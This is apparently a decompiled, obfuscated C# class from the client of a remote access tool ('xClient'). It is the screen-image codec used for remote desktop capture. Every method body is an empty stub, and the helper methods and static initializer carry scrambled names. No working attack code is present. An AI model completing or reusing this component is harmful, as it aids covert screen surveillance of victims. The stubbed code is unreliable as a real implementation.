using System;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Runtime.CompilerServices;
using dg3ypDAonQcOidMs0w;
using xClient.Core.Compression;

namespace xClient.Core.Utilities;

public class UnsafeStreamCodec : IDisposable
{
	private int _imageQuality;

	private byte[] _encodeBuffer;

	private Bitmap _decodedBitmap;

	private PixelFormat _encodedFormat;

	private int _encodedWidth;

	private int _encodedHeight;

	private readonly object _imageProcessLock;

	private JpgCompression _jpgCompression;

	internal static UnsafeStreamCodec bldD5KkHngNhk2HdRGi;

	public int Monitor
	{
		[CompilerGenerated]
		get
		{
			return 0;
		}
		[CompilerGenerated]
		private set
		{
		}
	}

	public string Resolution
	{
		[CompilerGenerated]
		get
		{
			return null;
		}
		[CompilerGenerated]
		private set
		{
		}
	}

	public Size CheckBlock
	{
		[CompilerGenerated]
		get
		{
			return (Size)(object)null;
		}
		[CompilerGenerated]
		private set
		{
		}
	}

	public int ImageQuality
	{
		get
		{
			return 0;
		}
		private set
		{
		}
	}

	public UnsafeStreamCodec(int imageQuality, int monitor, string resolution)
	{
	}

	public void Dispose()
	{
	}

	protected virtual void Dispose(bool disposing)
	{
	}

	public void CodeImage(IntPtr scan0, Rectangle scanArea, Size imageSize, PixelFormat format, Stream outStream)
	{
	}

	public Bitmap DecodeData(IntPtr codecBuffer, uint length)
	{
		return null;
	}

	public Bitmap DecodeData(Stream inStream)
	{
		return null;
	}

	static UnsafeStreamCodec()
	{
		WP6RZJql8gZrNhVA9v.prXoP4RuYp();
		WP6RZJql8gZrNhVA9v.iXLoKRSpAw();
	}

	internal static bool AxCUuokImYk1EWCjaKx()
	{
		return true;
	}

	internal static UnsafeStreamCodec u7w2ofkyKWhfufmbkcC()
	{
		return null;
	}

	internal static void VNlrf8kpRBnsm3ESCdt(object object_0)
	{
	}

	internal static void EGIkrAk9wUfpiu7IjCF(object object_0)
	{
	}

	internal static void cePudfkQJEDFZrm2evL()
	{
	}

	internal static void zViFxmkzJ0xNJ2G2wH9(object object_0, bool disposing)
	{
	}

	internal static void hmqgkDSlVPjR9TxGtsV(object object_0)
	{
	}

	internal static void OvNfbpSqy9NQglwOC4I(object object_0)
	{
	}

	internal static bool Kb43fVS5GopMJrO9VeD(object object_0)
	{
		return true;
	}

	internal static object ieW7VOSA7pPBgbHQFt0(int int_0)
	{
		return null;
	}

	internal static object S7kRMKSMFCMkw5WJTav(object object_0, object object_1)
	{
		return null;
	}

	internal static void gyeTKPSXcoNux1vZrce(object object_0)
	{
	}

	internal static object xRamqYSikyPWfIdPDBP(int int_0)
	{
		return null;
	}

	internal static int KU4twfSkwNCD7tLGr1k(object object_0)
	{
		return 0;
	}

	internal static int ffLERfSSdiidNv6yFQH(object object_0)
	{
		return 0;
	}

	internal static object eTqQNtSLvn734QGx2ON(object object_0, Rectangle rectangle_0, ImageLockMode imageLockMode_0, PixelFormat pixelFormat_0)
	{
		return null;
	}

	internal static IntPtr j1lD12SeBkaaDnqrYV6(object object_0)
	{
		return (IntPtr)(object)null;
	}

	internal static void CBT82RSOmlj1SxmL1N2(object object_0, object object_1, int int_0, int int_1)
	{
	}

	internal static long b4Hf1ASWpbpclX8qjCN(object object_0)
	{
		return 0L;
	}

	internal static void plhm55SV5ikF84TLDnT(object object_0, long long_0)
	{
	}

	internal static object RqybLlS2NbAd3Q9YvVp(long long_0)
	{
		return null;
	}

	internal static void Bg3uInSxF47S5JKMVD3(object object_0, object object_1)
	{
	}

	internal static object sECal1Sa52XAgb6hyaF(object object_0)
	{
		return null;
	}

	internal static int IwdtqUS42jO5DdMbv0X(object object_0, object object_1, int int_0, int int_1)
	{
		return 0;
	}

	internal static int nRYYe2SbsVsFcXNLefL(object object_0, int int_0)
	{
		return 0;
	}

	internal static void O38WLVSEeTmRDu6U8no(object object_0, object object_1, Point point_0)
	{
	}
}
